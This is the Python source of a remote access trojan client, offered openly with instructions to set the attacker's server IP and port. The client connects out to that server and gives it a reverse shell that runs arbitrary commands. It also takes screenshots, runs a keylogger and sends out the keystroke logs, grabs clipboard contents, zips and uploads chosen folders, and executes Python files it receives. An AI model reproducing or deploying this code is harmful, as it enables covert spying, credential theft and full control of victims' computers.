"""
------ CONFIGURATION ------
In order to use this tool you need to do some tweaking:
    1. Replace the Server's IP with your own value
    2. Replace the PORT number with your own value
    3. Feel free to mess around with paths, I've set some default values but oyu can change them

"""

import socket
import subprocess
import sys
import os
import time
import platform
import threading
import pyperclip

from mss import mss
from zipfile import ZipFile
from pynput.keyboard import Key, Listener, Controller

class Client:
    def __init__(self, server_ip, port, buffer_size, client_ip):
        self.SERVER_IP = server_ip
        self.PORT = port
        self.BUFFER_SIZE = buffer_size
        self.CLIENT_IP = client_ip

        self.screenshot_counter = 0
        self.keyLogger = True

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connectToServer(self):
        self.client.connect((self.SERVER_IP, self.PORT))

    # try to update buffer size 
    def updateBuffer(self, size):
        buff = ""
        for counter in range(0, len(size)):
            if size[counter].isdigit():
                buff += size[counter]

        return int(buff)

    # for big files
    def saveBigFile(self, size, buff):
        full = b''
        while True:
            if sys.getsizeof(full) >= size:
                break

            recvfile = self.client.recv(buff)

            full += recvfile
        
        return full

    def sendHostInfo(self):
        """ Extracting host information """

        host = sys.platform
        self.client.send(host.encode("utf-8"))

        cpu = platform.processor()
        system = platform.system()
        machine = platform.machine()

        with open('./logs/info.txt', 'w+') as f:
            f.writelines(["CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n'])

        with open('./logs/info.txt', 'rb+') as f:
            self.client.send(f.read())

        os.remove('./logs/info.txt')

    def screenshot(self):
        sct = mss()
        sct.shot(output = './logs/screen{}.png'.format(self.screenshot_counter))

        picsize = os.path.getsize('./logs/screen{}.png'.format(self.screenshot_counter))
        size = str(picsize)
        self.client.send(size.encode("utf-8"))

        screen = open('./logs/screen{}.png'.format(self.screenshot_counter), 'rb')
        tosend = screen.read()
        self.client.send(tosend)
        
        screen.close()
        os.remove('./logs/screen{}.png'.format(self.screenshot_counter))
        self.screenshot_counter += 1

    def receiveFile(self):
        # recv name
        recvname = self.client.recv(self.BUFFER_SIZE)
        name = recvname.decode("utf-8")

        # recv size
        recvsize = self.client.recv(self.BUFFER_SIZE)
        size = recvsize.decode("utf-8")

        if int(size) <= self.BUFFER_SIZE:
            recvfile = self.client.recv(self.BUFFER_SIZE)
            with open(f'./logs/{name}', 'wb+') as f:
                f.write(recvfile)
        else:
            # updating buffer
            buff = self.updateBuffer(size)

            # recv file
            fullfile = self.saveBigFile(int(size), buff)

            # saving the file
            with open(f'./logs/{name}', 'wb+') as f:
                f.write(fullfile)

    def runFile(self):
        """ Running a Python file in a hidden window """

        exfile = self.client.recv(self.BUFFER_SIZE)
        exfilepath = exfile.decode("utf-8") 

        try:
            exec(open(exfilepath).read())
            self.client.send("OK".encode("utf-8"))
        except:
            self.client.send("ERROR".encode("utf-8"))

    def sendFile(self):        
        path = self.client.recv(self.BUFFER_SIZE).decode("utf-8")
        
        filelist = os.listdir(path)
        self.client.send("OK".encode("utf-8"))
        time.sleep(0.1)

        # create a zip archive
        archname = './logs/files.zip'
        archive = ZipFile(archname, 'w')

        for file in filelist:
            archive.write(path + '/' + file)

        archive.close()

        # send size
        arcsize = os.path.getsize(archname)
        self.client.send(str(arcsize).encode("utf-8"))
        time.sleep(0.1)

        # send archive
        with open('./logs/files.zip', 'rb') as to_send:          
            self.client.send(to_send.read())
        
        os.remove(archname)

    def stopKeyLogger(self):
        """ press esc key for stopping the key logger """

        keyboard = Controller()
        keyboard.press(Key.esc)
        keyboard.release(Key.esc)
        self.keyLogger = False

    def sendKeyLogs(self):
        try:
            archname = './logs/files.zip'
            archive = ZipFile(archname, 'w')

            archive.write('./logs/readable.txt')
            archive.write('./logs/keycodes.txt')

            archive.close()
            self.client.send("[OK]".encode("utf-8"))
            time.sleep(0.1)

            # send size
            arcsize = os.path.getsize(archname)
            self.client.send(str(arcsize).encode("utf-8"))
            time.sleep(0.1)

            # send archive
            with open('./logs/files.zip', 'rb') as to_send:           
                self.client.send(to_send.read())
           
            os.remove(archname)

        except:
            self.client.send("[ERROR]".encode("utf-8"))

    def sendClipBoard(self):
        """ 
        Requirements:
            - xsel
            - xclip
        """
        cb = pyperclip.paste() # acces the clipboard
        if len(cb) == 0:
            self.client.send("/".encode("utf-8"))
        else:
            self.client.send(cb.encode("utf-8"))

    def reverseShell(self):
        """ start thread for key logger """

        start = Keylogger()
        kThread = threading.Thread(target = start.run)
        kThread.start()

        while True:
            command = self.client.recv(self.BUFFER_SIZE)
            dcommand = command.decode("utf-8")

            if not command:
                os.system("clear")
                self.client.close()
                break

            if dcommand == "#": 
                continue # ignoring message to check if connetion is up
            elif dcommand.lower() == "--esc":
                break

            elif dcommand.lower() == "--takescreen":
                self.screenshot()

            elif dcommand.lower() == "--recv":
                self.receiveFile()

            elif dcommand.lower() == "--run":
                self.runFile()

            elif dcommand.lower() == "--ginfo":
                self.sendHostInfo()

            elif dcommand.lower() == "--download":
                try:
                    self.sendFile()
                except:
                    self.client.send("*** Error, check the path and retry".encode("utf-8"))

            elif dcommand.lower() == "--stop":
                self.stopKeyLogger()
                self.client.send("[*] Key Logger stopped.".encode("utf-8"))

            elif dcommand.lower() == "--getlogs":
                self.sendKeyLogs()

            elif dcommand.lower() == "--ccb":
                self.sendClipBoard()

            elif "cd" in dcommand:
                try:
                    d = dcommand[3:].strip()
                    os.chdir(d)
                    self.client.send("[*] Done".encode("utf-8"))
                except:
                    self.client.send("[*] Dir not found / something went wrong.".encode("utf-8s"))
            else:
                """ Shell """
                obj = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")

                if output == "" or output == "\n":
                    self.client.send("[*] Done".encode("utf-8"))
                else:
                    self.client.send(output.encode("utf-8"))

        if self.keyLogger == True:
            self.stopKeyLogger()
            
        self.client.close()

class Keylogger:
    def __init__(self):
        self.special = False

        """ for more readable logs """
        self.keycodes = {
            "Key.enter" : '\n',
            "Key.space" : ' ',
            "Key.shift_l" : '',
            "Key.shift_r" : '',
            "Key.tab" : "[TAB]",
            "Key.backspace" : "[BACKSPACE]",
            "Key.caps_lock" : "[CAPSLOCK]",
            "Key.ctrl" : "[CTRL]"
        }

        try:
            os.mkdir('./logs')
        except FileExistsError:
            pass

    def onPress(self, key):
        if key == Key.esc:
            return False

        with open('./logs/readable.txt', 'a+') as log, open('./logs/keycodes.txt', 'a+') as codes:
            # key codes
            codes.write(str(key) + '\n')

            # readable keys
            for keycode in self.keycodes:
                if keycode == str(key):
                    self.special = True
                    log.write(self.keycodes[keycode])
                    break
            
            if self.special == False:
                log.write(str(key).replace("'", ""))
            
            self.special = False

    def run(self):
        with Listener(on_press = self.onPress) as listener:
            listener.join() # listening for keystrokes


def main():
    SERVER_IP = "SERVER_IP" # MODIFY ME
    PORT = 1234 # MODIFY ME (if you want)
    BUFFER_SIZE = 2048

    try:
        os.mkdir('./logs')
    except FileExistsError:
        pass

    try:
        """ Creating files before starting everything """

        os.mknod("./logs/keycodes.txt")
        os.mknod("./logs/readable.txt")
        os.mknod("./logs/info.txt")
    except FileExistsError:
        pass

    CLIENT = socket.gethostname()
    CLIENT_IP = socket.gethostbyname(CLIENT)
    
    client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)
    
    client.connectToServer()
    client.reverseShell()

if __name__ == "__main__":
    main()